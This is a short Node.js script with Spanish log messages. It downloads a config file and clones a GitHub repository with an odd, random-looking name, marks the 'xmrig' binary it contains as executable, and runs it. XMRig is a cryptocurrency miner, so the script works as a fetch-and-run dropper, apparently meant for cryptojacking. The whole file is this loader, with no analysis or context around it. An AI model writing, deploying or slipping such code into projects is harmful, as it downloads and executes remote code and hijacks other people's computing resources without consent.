const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');

const configFileURL = 'https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
const configFilePath = 'config.json';
const xmrigURL = 'https://github.com/flikamitai/Ufcujcfuuguf/raw/main/xmrig';

const file = fs.createWriteStream(configFilePath);
const request = https.get(configFileURL, function(response) {
  response.pipe(file);
});

request.on('error', function(err) {
  console.error(`Error al descargar el archivo config.json: ${err.message}`);
});

request.on('finish', function() {
  console.log('Descarga del archivo config.json completada.');
  file.close();

  const cloneCommand = 'git clone https://github.com/flikamitai/Ufcujcfuuguf.git';
  exec(cloneCommand, (cloneError, cloneStdout, cloneStderr) => {
    if (cloneError) {
      console.error(`Error al clonar el repositorio: ${cloneError}`);
      return;
    }
    console.log(`Clonación exitosa: ${cloneStdout}`);
    console.error(`stderr: ${cloneStderr}`);

    fs.chmodSync('Ufcujcfuuguf/xmrig', '755'); // Cambiar permisos del archivo xmrig

    const runCommand = './Ufcujcfuuguf/xmrig -c config.json';
    exec(runCommand, (runError, runStdout, runStderr) => {
      if (runError) {
        console.error(`Error al ejecutar xmrig: ${runError}`);
        return;
      }
      console.log(`xmrig ejecutándose: ${runStdout}`);
      console.error(`stderr: ${runStderr}`);
    });
  });
});
